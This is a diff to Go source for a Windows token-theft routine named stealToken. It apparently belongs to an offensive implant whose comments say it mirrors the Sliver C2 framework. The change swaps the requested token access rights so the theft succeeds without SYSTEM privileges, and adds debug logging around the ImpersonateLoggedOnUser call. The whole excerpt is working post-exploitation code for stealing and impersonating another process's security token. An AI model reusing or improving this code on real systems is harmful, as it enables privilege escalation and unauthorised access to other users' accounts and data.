@@ -206,15 +206,16 @@ func stealToken(pid uint32) (string, error) {
 	defer windows.CloseHandle(hProcess)
 	debugLog.WriteString("[DEBUG] OpenProcess succeeded\n")
 
-	// Open process token (exactly like Sliver: TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY)
+	// Open process token - use TOKEN_IMPERSONATE instead of TOKEN_ASSIGN_PRIMARY for non-SYSTEM contexts
+	// TOKEN_ASSIGN_PRIMARY requires SYSTEM-level access
 	debugLog.WriteString("[DEBUG] Calling OpenProcessToken...\n")
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] Requested access: TOKEN_DUPLICATE(0x%x) | TOKEN_ASSIGN_PRIMARY(0x%x) | TOKEN_QUERY(0x%x)\n", 
-		windows.TOKEN_DUPLICATE, windows.TOKEN_ASSIGN_PRIMARY, windows.TOKEN_QUERY))
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] Requested access: TOKEN_DUPLICATE(0x%x) | TOKEN_IMPERSONATE(0x%x) | TOKEN_QUERY(0x%x)\n", 
+		windows.TOKEN_DUPLICATE, windows.TOKEN_IMPERSONATE, windows.TOKEN_QUERY))
 	
 	var primaryToken windows.Token
 	err = windows.OpenProcessToken(
 		hProcess,
-		windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY,
+		windows.TOKEN_DUPLICATE|windows.TOKEN_IMPERSONATE|windows.TOKEN_QUERY,
 		&primaryToken,
 	)
 	if err != nil {
@@ -253,9 +254,12 @@ func stealToken(pid uint32) (string, error) {
 
 	// KEY: Impersonate the PRIMARY token FIRST (exactly like Sliver's impersonateProcess)
 	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser on primary token...\n")
-	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(primaryToken))
+	ret, _, _ := procImpersonateLoggedOnUser.Call(uintptr(primaryToken))
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] ImpersonateLoggedOnUser returned: %d\n", ret))
 	if ret == 0 {
-		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
+		lastErr := windows.GetLastError()
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] GetLastError: 0x%x\n", lastErr))
+		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser failed (ret=%d, lastErr=0x%x)", ret, lastErr)
 	}
 	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser succeeded\n")
 
